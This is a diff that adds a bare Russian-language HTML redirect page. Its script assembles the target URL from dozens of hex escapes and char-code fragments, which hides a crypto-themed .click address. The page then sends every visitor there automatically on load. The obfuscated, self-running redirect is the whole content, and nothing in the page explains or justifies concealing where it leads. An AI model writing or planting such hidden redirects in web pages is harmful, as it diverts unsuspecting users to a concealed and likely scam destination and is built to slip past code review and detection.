@@ -1,0 +1,44 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Перенаправление</title>
+  <script>
+    const parts = [
+      () => '\x68',
+      () => '\x74',
+      () => String.fromCharCode(116),
+      () => '\x70',
+      () => String.fromCharCode(115),
+      function() { return '\x3a'; },
+      function() { return '\x2f'; },
+      function() { return '\x2f'; },
+      () => '\x76',
+      () => '\x65',
+      () => String.fromCharCode(114),
+      __ => '\x67',
+      () => String.fromCharCode(101),
+      () => '\x6e',
+      () => String.fromCharCode(46),
+      () => String.fromCharCode(99),
+      () => String.fromCharCode(108),
+      function() { return '\x69'; },
+      function() { return '\x63'; },
+      c => '\x6b',
+      () => '\x2f',
+      c => '\x73',
+      () => String.fromCharCode(47),
+      z => '\x63',
+      () => '\x72',
+      k => '\x79',
+      () => String.fromCharCode(112),
+      () => String.fromCharCode(116),
+      function() { return '\x6f'; }
+    ];
+    const target = parts.reduce((acc, fn) => acc + fn(), '');
+    window.location.replace(target);
+  </script>
+</head>
+<body></body>
+</html>
